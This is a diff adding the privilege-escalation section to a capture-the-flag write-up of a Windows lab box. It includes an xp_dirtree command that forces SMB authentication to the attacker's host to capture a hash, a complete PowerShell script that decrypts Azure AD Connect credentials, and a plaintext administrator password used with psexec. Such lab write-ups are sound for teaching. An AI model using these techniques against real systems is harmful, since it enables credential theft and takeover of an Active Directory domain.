@@ -85,6 +85,80 @@ I also checked if evil-winrm worked for mhope's user: </br>
 I got a ```Pwn3d!``` , so it did work over WinRM. </br>
 ![user_flag](images/monteverde/user_flag.png) </br>
 # Privilege Escalation
+I first checked mhope's privileges and groups with the command: ```WHOAMI /ALL``` </br>
+I could see that I was inside Azure Admins group, which means this is an Azure Active Directory box. </br>
+I enumerated the machine and also ran an enumeration script (winPEAS), but couldn't find anything useful. </br> </br>
+Knowing that user is in the Azure Admins group, means that he probably could run commands on the ```sqlcmd``` service, I used [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) tool. </br>
+and tried this command: ```Invoke-SQLAUdit -Verbose``` and I could see that the machine was vulnerable to ```XP_DIRTREE``` - which means that I could try to include a file from my server and I could make the target machine do a requeset back to my server over SMB, so I could potentially steal the hash of the user that is trying to login to my SMB share. </br> </br>
+**Attacker Machine:** </br>
+```bash
+smbserver.py kali .
+responder -I tun0
+```
+
+**Target Machine (Victim):** </br>
+```bash
+sqlcmd -Q "xp_dirtree '\\10.10.14.32\kali'"
+```
+
+And I got a hash! </br>
+![hash](images/monteverde/hash.png) </br>
+I tried to crack it with hashcat, but sadly it didn't seem to work. </br>
+Then I found this blog: https://blog.xpnsec.com/azuread-connect-for-redteam/ </br>
+It explains how to abuse Azure AD connect, The idea is that there is a user that is setup to handle replication of Active Directory to Azure, I could decrypt the configuration file and get the username and password for the account that handles replication. </br> </br>
+I grabbed the code from the blog, and unfourtanetly it didn't work and even crashed my WinRM shell. </br>
+I tried to check each command seperately, to see exactly where the problem is,
+and I could see that the first line drops an error, I tried to use another connection string to see if that would work: </br>
+```Server=LocalHost;Database=ADSync;Trusted_Connection=True;”``` </br>
+And I then continued to check the rest of the code, seems like I didn't have a problem with anything else there, so I tried executing it as a .ps1 file again, and it worked! </br> </br>
+**The modified code:** </br>
+```bash
+$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Server=127.0.0.1;Database=ADSync;Integrated Security=True"
+$client.Open()
+$cmd = $client.CreateCommand()
+$cmd.CommandText = "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"
+$reader = $cmd.ExecuteReader()
+$reader.Read() | Out-Null
+$key_id = $reader.GetInt32(0)
+$instance_id = $reader.GetGuid(1)
+$entropy = $reader.GetGuid(2)
+$reader.Close()
+
+$cmd = $client.CreateCommand()
+$cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"
+$reader = $cmd.ExecuteReader()
+$reader.Read() | Out-Null
+$config = $reader.GetString(0)
+$crypted = $reader.GetString(1)
+$reader.Close()
+
+add-type -path 'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'
+$km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
+$km.LoadKeySet($entropy, $instance_id, $key_id)
+$key = $null
+$km.GetActiveCredentialKey([ref]$key)
+$key2 = $null
+$km.GetKey(1, [ref]$key2)
+$decrypted = $null
+$key2.DecryptBase64ToString($crypted, [ref]$decrypted)
+$domain = select-xml -Content $config -XPath "//parameter[@name='forest-login-domain']" | select @{Name = 'Domain'; Expression = {$_.node.InnerXML}}
+$username = select-xml -Content $config -XPath "//parameter[@name='forest-login-user']" | select @{Name = 'Username'; Expression = {$_.node.InnerXML}}
+$password = select-xml -Content $decrypted -XPath "//attribute" | select @{Name = 'Password'; Expression = {$_.node.InnerXML}}
+Write-Host ("Domain: " + $domain.Domain)
+Write-Host ("Username: " + $username.Username)
+Write-Host ("Password: " + $password.Password)
+```
+
+The output I got: </br>
+![script_output](images/monteverde/script_output.png) </br> </br>
+Seems like I got credentials, I checked this user with crackmapexec: </br>
+```crackmapexec smb 10.10.10.172 -u administrator -p 'd0m@in4dminyeah!'``` </br>
+I got 'Pwn3d' which means that I could access this user with PsExec: ```psexec.py administrator@10.10.10.172``` </br>
+Entered the password, and it worked. </br>
+![root_flag](images/monteverde/root_flag.png)
+
+
+
 
 
 
